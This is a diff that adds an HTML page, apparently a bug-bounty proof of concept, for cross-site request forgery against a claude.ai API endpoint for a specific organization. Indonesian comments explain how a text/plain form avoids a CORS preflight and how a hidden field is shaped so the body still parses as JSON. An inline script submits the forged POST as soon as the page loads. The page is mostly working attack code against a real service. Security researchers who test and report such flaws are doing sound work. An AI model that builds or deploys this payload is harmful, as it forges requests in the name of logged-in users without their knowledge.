@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF PoC - claude.ai reflections/time_spent</title>
+</head>
+<body>
+  <h3>CSRF PoC - authorized testing only (Anthropic HackerOne program)</h3>
+  <p>Status: <span id="status">not sent yet</span></p>
+
+  <!--
+    Teknik: enctype="text/plain" dipakai supaya browser TIDAK trigger
+    CORS preflight (OPTIONS) untuk request ini, karena content-type
+    yang dikirim dianggap "simple" oleh spec fetch/CORS.
+    Body-nya diformat manual supaya, setelah di-parse sebagai text/plain,
+    isinya tetap valid JSON kalau backend parsing-nya longgar.
+  -->
+  <form id="csrfForm" action="https://claude.ai/api/organizations/13ced8b6-b191-4204-aaa6-037920f314d4/reflections/time_spent"
+        method="POST" enctype="text/plain">
+    <input type="hidden" name='{"ms":11776,"date":"2026-08-21", "junk":"' value='"}'>
+  </form>
+
+  <script>
+    const statusEl = document.getElementById('status');
+    statusEl.textContent = 'submitting form to claude.ai...';
+    // auto-submit
+    document.getElementById('csrfForm').submit();
+  </script>
+</body>
+</html>
